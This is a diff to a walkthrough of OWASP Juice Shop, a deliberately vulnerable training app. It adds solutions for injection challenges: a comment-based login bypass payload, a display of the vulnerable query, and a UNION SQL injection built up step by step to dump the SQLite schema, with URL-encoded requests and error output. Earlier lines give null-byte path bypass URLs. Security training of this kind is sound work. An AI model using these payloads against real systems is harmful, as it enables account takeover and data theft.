@@ -46,7 +46,7 @@ which is effectively:
 ```
 "sql": "SELECT * FROM Users WHERE email = '' OR TRUE"
 ```
-Since this query always return TRUE, the database will return every record. Since the application expects only one user to be returned, it will automatically take the first record from the result set. In this case it will be the admin login. The first user is often the admin because user IDs are usually incremented from 1 and admin accounts are often created first in a database.
+Since this query always returns TRUE, the database will return every record. Since the application expects only one user to be returned, it will automatically take the first record from the result set. In this case it will be the admin login. The first user is often the admin because user IDs are usually incremented from 1 and admin accounts are often created first in a database.
 ### 6. Admin Section
 Navigate to this URL:
 ```
@@ -265,3 +265,61 @@ This problem was pretty tricky, especially considering that the official solutio
 ```
 http://localhost:3000/ftp/eastere.gg%2500.md
 http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
+```
+## Injection
+### 1. Login Jim / Login Bender
+Both problems have same solution with different emails. Locate Jim's email in one of the product's reviews. Navigate to the login screen. To bypass the password, which we don't have, comment out the rest of the internal query after the email:
+```
+jim@juice-sh.op'--
+```
+Note that you must also end the email string with a single quote ```'```.
+The same approach works for Bender with the email bender@juice-sh.op. The associated code fix challenge reveals why this attack works. The login query takes direct user input instead of binding to pre-defined variables:
+```
+models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
+```
+which then becomes:
+```
+    models.sequelize.query(`SELECT * FROM Users WHERE email = '${jim@juice-sh.op'-- || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
+```
+### 2. Database Schema
+For this challenge, the hacker must utilize injection to pass some query that returns the schema definition. First, identify that the application usews a SQLite database. This is documented in the [architecture overview](https://pwning.owasp-juice.shop/companion-guide/latest/introduction/architecture.html). Look up the query to get the schema definition for a SQLite database (I used Chat-GPT) and it should be something like this:
+```
+SELECT sql FROM sqlite_master WHERE type IN ('table', 'index', 'view', 'trigger');
+```
+Now we have an idea of what the malicious payload will need to look like. Next, identify a place to inject sql queries. The obvious choice is the search bar because it pulls matching product records from the SQLite database. Messing around with the search bar UI doesn't provide any information about an injection attack being possible, let alone how the underlying query is structured. Instead, inspect the network traffic to find the corresponding GET request:
+```
+GET /rest/products/search?q= HTTP/1.1
+```
+repeat the request with different values after `q=` to find a vulnerability. Specifically, this request should trigger a SQLite error response:
+```
+GET /rest/products/search?q='; HTTP/1.1
+
+ "error": {
+    "message": "SQLITE_ERROR: near \";\": syntax error",
+    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
+    "errno": 1,
+    "code": "SQLITE_ERROR",
+    "sql": "SELECT * FROM Products WHERE ((name LIKE '%';%' OR description LIKE '%';%') AND deletedAt IS NULL) ORDER BY name"
+  }
+```
+Now the underlying query has been exposed and we can easily craft a malicious union query:
+```
+SELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT sql FROM sqlite_master;--%' OR description LIKE '%<input>%') AND deletedAt IS NULL) ORDER BY name"
+```
+Therefore, `q=')) UNION SELECT sql FROM sqlite_master;--`
+Make sure to URL encode the query before sending it as a request:
+```
+'))%20UNION%20SELECT%20sql%20FROM%20sqlite_master;--
+```
+You should get this error in the response:
+```
+ "error": {
+    "message": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
+    "stack": "Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
+    "errno": 1,
+    "code": "SQLITE_ERROR",
+    "sql": "SELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT sql FROM sqlite_master;--%' OR description LIKE '%')) UNION SELECT sql FROM sqlite_master;--%') AND deletedAt IS NULL) ORDER BY name"
+  }
+```
+In order for a union query to compile, both result tables must have the same number of columns with the same datatypes. Try adding dummy columns until this query compiles:
+`q=')) UNION SELECT sql, 1, 2, 3, 4, 5, 6, 7, 8 FROM sqlite_master;--` --> URL Encode --> `q='))%20UNION%20SELECT%20sql,%201,%202,%203,%204,%205,%206,%207,%208%20FROM%20sqlite_master;--`
